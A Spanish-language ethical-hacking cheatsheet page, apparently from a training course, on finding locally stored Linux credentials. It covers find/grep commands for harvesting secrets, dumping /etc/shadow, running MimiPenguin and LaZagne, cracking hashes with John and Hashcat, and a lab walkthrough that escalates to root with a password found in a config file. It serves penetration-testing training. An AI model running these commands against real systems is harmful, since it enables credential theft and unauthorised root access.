
# Locally Stored Credentials

## <mark style="color:purple;">Introducción</mark>

En los sistemas Linux, las credenciales pueden almacenarse de varias formas, tanto de manera segura (como hashes en `/etc/shadow`) como de forma insegura (contraseñas en texto claro en archivos de configuración, scripts, o historial de comandos). La recolección de credenciales es un paso fundamental en el proceso de post-explotación y movimiento lateral.

***

### Ubicaciones comunes de credenciales en Linux

#### **Archivos del sistema (`/etc`)**

<table data-header-hidden><thead><tr><th width="167"></th><th width="440.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Archivo</td><td>Descripción</td><td>Acceso</td></tr><tr><td><code>/etc/shadow</code></td><td>Contiene los hashes de las contraseñas de los usuarios</td><td>Solo root</td></tr><tr><td><code>/etc/passwd</code></td><td>Contiene información de usuarios (sin contraseñas)</td><td>Lectura global</td></tr><tr><td><code>/etc/gshadow</code></td><td>Contiene hashes de contraseñas de grupos</td><td>Solo root</td></tr><tr><td><code>/etc/sudoers</code></td><td>Configuración de privilegios sudo</td><td>Solo root</td></tr><tr><td><code>/etc/pam.d/</code></td><td>Configuración de autenticación</td><td>Lectura global</td></tr></tbody></table>

#### **Archivos de usuario (`~`)**

<table data-header-hidden><thead><tr><th width="231.3333740234375"></th><th></th></tr></thead><tbody><tr><td>Ubicación</td><td>Posibles credenciales</td></tr><tr><td><code>~/.bash_history</code></td><td>Comandos con contraseñas en texto claro</td></tr><tr><td><code>~/.ssh/id_rsa</code></td><td>Claves privadas SSH (si no tienen passphrase)</td></tr><tr><td><code>~/.ssh/authorized_keys</code></td><td>Claves autorizadas</td></tr><tr><td><code>~/.gnupg/</code></td><td>Claves GPG</td></tr><tr><td><code>~/.mysql_history</code></td><td>Comandos de MySQL con posibles contraseñas</td></tr><tr><td><code>~/.psql_history</code></td><td>Comandos de PostgreSQL</td></tr></tbody></table>

#### **Archivos de aplicaciones y servicios**

<table data-header-hidden><thead><tr><th width="170"></th><th></th></tr></thead><tbody><tr><td>Aplicación</td><td>Ubicación típica</td></tr><tr><td>Apache</td><td><code>/etc/apache2/*.conf</code>, <code>/var/www/html/.htaccess</code></td></tr><tr><td>Nginx</td><td><code>/etc/nginx/*.conf</code></td></tr><tr><td>MySQL/MariaDB</td><td><code>/etc/mysql/debian.cnf</code>, <code>~/.my.cnf</code></td></tr><tr><td>PostgreSQL</td><td><code>~/.pgpass</code></td></tr><tr><td>FTP</td><td><code>/etc/vsftpd.conf</code>, <code>/etc/proftpd/proftpd.conf</code></td></tr><tr><td>Samba</td><td><code>/etc/samba/smb.conf</code></td></tr><tr><td>Docker</td><td><code>/etc/docker/daemon.json</code></td></tr><tr><td>Cloud-init</td><td><code>/etc/cloud/cloud.cfg</code> (contraseñas en texto claro)</td></tr></tbody></table>

#### **Archivos de configuración de aplicaciones**

<table data-header-hidden><thead><tr><th width="238"></th><th></th></tr></thead><tbody><tr><td>Archivo</td><td>Descripción</td></tr><tr><td><code>wp-config.php</code></td><td>Contraseñas de bases de datos de WordPress</td></tr><tr><td><code>.env</code></td><td>Variables de entorno con credenciales (Laravel, Django)</td></tr><tr><td><code>config.php</code>, <code>settings.py</code></td><td>Configuraciones con credenciales</td></tr><tr><td><code>id_rsa</code>, <code>id_dsa</code></td><td>Claves privadas SSH</td></tr><tr><td><code>.netrc</code>, <code>.authinfo</code></td><td>Credenciales para FTP/HTTP</td></tr></tbody></table>

***

## <mark style="color:purple;">Credential Hunting</mark>

### **Búsqueda manual**

#### **Archivos de configuración sospechosos**

```bash
# Archivos .conf, .cfg, .config, .ini en todo el sistema
find / -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.config" -o -name "*.ini" \) -exec grep -l "password" {} \; 2>/dev/null

# Buscar archivos .env (comunes en aplicaciones web)
find / -type f -name ".env" 2>/dev/null

# Buscar archivos de configuración de bases de datos
find / -type f \( -name "my.cnf" -o -name ".my.cnf" -o -name "wp-config.php" \) 2>/dev/null
```

#### **Cadenas específicas dentro de archivos**

```bash
# Buscar contraseñas en archivos de texto
grep -r "password" /var/www/html/ 2>/dev/null | grep -v ".css\|.js\|.png\|.jpg"

# Buscar cadenas como 'pass', 'pwd', 'key', 'token', 'secret'
grep -r -E "(pass|pwd|key|token|secret)" /home/*/.* 2>/dev/null

# Búsqueda más específica con expresiones regulares
grep -r -E "password\s*=\s*['\"]?[^'\"]+['\"]?" /etc/ 2>/dev/null
```

#### **Historial de comandos**

```bash
# Historial del usuario actual
cat ~/.bash_history | grep -E "(pass|pwd|ssh|mysql|psql)"

# Historiales de todos los usuarios
find /home -name ".*history" -exec cat {} \; 2>/dev/null | grep -E "(pass|pwd|ssh)"
```

#### **Extraer hashes de `/etc/shadow` (requiere root)**

```bash
# Volcar todos los hashes
cat /etc/shadow

# Guardar hashes para cracking offline
cat /etc/shadow | grep -v ":\*:" | grep -v ":!" > hashes.txt
```

### **Herramientas automatizadas**

#### **CredHunter**

{% embed url="<https://github.com/ismailcemunver/CredHunter>" %}

Script shell para buscar información sensible:

```
git clone https://github.com/ismailcemunver/CredHunter.git
cd CredHunter
chmod +x credhunter.sh
./credhunter.sh
```

CredHunter busca en archivos de configuración, bases de datos, scripts y bash history.

#### **Dredge**

{% embed url="<https://github.com/grahamhelton/dredge>" %}

Herramienta CLI para buscar secretos en el sistema de archivos:

```bash
# Instalación
go install github.com/grahamhelton/dredge@latest

# Ejecución
dredge / --pattern "password"
```

Permite búsquedas de patrones como `key=`, `token=`.

***

### Credenciales en memoria

#### **MimiPenguin**

{% embed url="<https://github.com/huntergregal/mimipenguin>" %}

MimiPenguin extrae contraseñas en texto claro de la memoria de procesos como:

* Gnome Keyring (gestor de contraseñas de escritorio)
* LightDM (pantalla de inicio de sesión)
* GDM (GNOME Display Manager)
* KDM (KDE Display Manager)
* Apache (sesiones HTTP Basic Auth)
* OpenSSH (sesiones activas)

```bash
# Clonar e instalar
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
chmod +x mimipenguin.sh

# Ejecutar (como root para mejores resultados)
sudo ./mimipenguin.sh
```

MimiPenguin utiliza los archivos `/proc/<PID>/maps` y `/proc/<PID>/mem` para buscar patrones regex en la memoria del proceso.

**Versión Python:**

```bash
# Requiere python3 y psutil
pip install psutil
python3 mimipenguin.py
```

#### **LaZagne - Credentials Recovery Tool**

{% embed url="<https://github.com/AlessandroZ/LaZagne>" %}

LaZagne recupera contraseñas almacenadas de múltiples aplicaciones: navegadores (Chrome, Firefox), clientes de correo, bases de datos, sistemas y más.

{% content-ref url="/pages/QTcJXcnlowqvOMXfUZUY" %}
[LaZagne](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/lazagne.md)
{% endcontent-ref %}

```bash
# Clonar
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne/Linux

# Ejecutar todos los módulos
python3 laZagne.py all

# Módulos específicos
python3 laZagne.py browsers    # Contraseñas de navegadores
python3 laZagne.py databases   # Credenciales de bases de datos
python3 laZagne.py system      # Credenciales del sistema (shadow)
python3 laZagne.py memory      # Extraer de memoria

# Guardar en archivo
python3 laZagne.py all -o output.txt
```

LaZagne soporta más de 12 programas en Linux, incluyendo Firefox, Chrome, Thunderbird, MySQL, PostgreSQL, etc..

***

## <mark style="color:purple;">Cracking de hashes</mark>

Una vez obtenidos los hashes del archivo `/etc/shadow`, se pueden crackear offline con herramientas como John the Ripper o Hashcat.

### **Extraer hashes con formato adecuado**

Si tienes acceso a `/etc/passwd` y `/etc/shadow`, usa `unshadow` para combinarlos:

```bash
# Extraer hashes en formato adecuado
unshadow /etc/passwd /etc/shadow > hashes_combined.txt

# O directamente desde shadow
cat /etc/shadow | grep -v ':\*:' | grep -v ':!' > shadow_hashes.txt
```

### **John the Ripper**

```bash
# Instalación (Kali/Parrot)
sudo apt install john

# Cracking con diccionario
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_combined.txt

# Cracking con reglas
john --wordlist=rockyou.txt --rules hashes_combined.txt

# Mostrar contraseñas crackeadas
john --show hashes_combined.txt
```

### **Hashcat**

```bash
# Identificar el tipo de hash
hashcat --identify hash.txt

# Cracking con diccionario (hash type 1800 para sha512crypt)
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Cracking con fuerza bruta (máscara)
hashcat -m 1800 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Modo reglas
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

***

## <mark style="color:purple;">Automatización con scripts</mark>

#### **Script personalizado de hunting**

```
#!/bin/bash
# Credential Hunting Script

echo "[*] Buscando archivos de configuración con credenciales..."
find / -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" \) -exec grep -l -E "(password|passwd|pwd|api_key|secret|token)" {} \; 2>/dev/null

echo "[*] Buscando en historiales..."
find /home -name ".*history" -exec cat {} \; 2>/dev/null | grep -E "(pass|pwd|ssh|mysql)"

echo "[*] Buscando claves SSH..."
find /home -name "id_rsa" -o -name "id_dsa" 2>/dev/null

echo "[*] Buscando en código fuente..."
find /var/www -type f -name "*.php" -o -name "*.py" -o -name "*.js" -o -name "*.rb" | xargs grep -l -E "(password|DB_PASSWORD|API_KEY)" 2>/dev/null
```

#### **Comando de búsqueda recursivo completo**

```
# Búsqueda masiva de patrones comunes
grep -r -E "(pass|pwd|key|token|secret|credential)" /etc /home /var /opt 2>/dev/null | grep -v ".log" | grep -v ".cache"
```

#### **Uso de `strings` en binarios**

```
# Extraer cadenas legibles de binarios que puedan contener credenciales
strings /usr/bin/mysql | grep -i "pass"
strings /usr/local/bin/* 2>/dev/null | grep -E "(password|pwd|key)"
```

***

## <mark style="color:purple;">Lab: Shared Server</mark>

La Universidad ABC imparte principalmente clases de desarrollo de aplicaciones web. Los estudiantes reciben cuentas en un servidor con acceso a internet para que puedan configurar sus scripts. Desafortunadamente, en su afán por ayudar, el administrador parece haber compartido demasiada información con los estudiantes. ¿Podría esto provocar una brecha de seguridad en el servidor?

La máquina objetivo es accesible en `http://target.ine.local:8000/`

**Has logrado hackear una cuenta de estudiante y obtener acceso al servidor. ¡Tu misión ahora es escalar tus privilegios, obtener acceso de root al servidor** y recuperar la flag!

Accedemos a

```bash
http://target.ine.local:8000/
```

Y vemos que estamos dentro del servidor como student:

```bash
student@target:~$ whoami
student

student@target:~$ sudo -l
User student may run the following commands on target:
    (root) NOPASSWD: /etc/init.d/mysql
```

Observamos que tenemos permisos NOPASSWD sobre mysql, que podríamos explotar si tenemos una contraseña.

### Credential Hunting

```bash
grep -r "password" /var/www/html/ 2>/dev/null | grep -v ".css\|.js\|.png\|.jpg"

<----SNIP---->
/var/www/html/language/th_TH/common.lang.php:$lang['Change my password'] = 'เปลี่ยนรหัสผ่านของฉัน';
/var/www/html/language/th_TH/common.lang.php:$lang['Enter your new password below.'] = 'กำหนดรหัสผ่านใหม่ของคุณด้านล่าง.';
/var/www/html/install.php:    array_push( $errors, l10n('please enter your password again') );
/var/www/html/install.php:$conf[\'db_password\'] = \''.$dbpasswd.'\';
/var/www/html/install.php:        'password'     => md5($admin_pass1),
```

Encontramos una contraseña de admin expuesta en `/var/www/html/install.php`

#### Búsqueda por db\_user

Encontramos otro archivo interesante con credenciales db\_user `root`:

```bash
student@target:/var/www/html$ grep -nr "db_user"

admin/include/functions_upgrade.php:322:    $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'], $conf['db_password'], $conf['db_base']);
i.php:412:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
upgrade_feed.php:63:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
include/common.inc.php:115:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
local/config/database.inc.php:4:$conf['db_user'] = 'root';
```

```bash
student@target:/var/www/html/local/config$ cat database.inc.php

<?php
$conf['dblayer'] = 'mysql';
$conf['db_base'] = 'piwigo';
$conf['db_user'] = 'root';$conf['db_password'] = 'w3lc0m3t0adlabs';
$conf['db_host'] = 'localhost';
```

### Cambiar a root

```bash
student@target:/var/www/html$ su
Password: w3lc0m3t0adlabs

root@target:/var/www/html# whoami
root
```

### Acceso a la flag

```bash
root@target:/var/www/html# cd /root
root@target:~# ls
flag
root@target:~# cat flag
760a582ebd219e2efb6dec17********
```
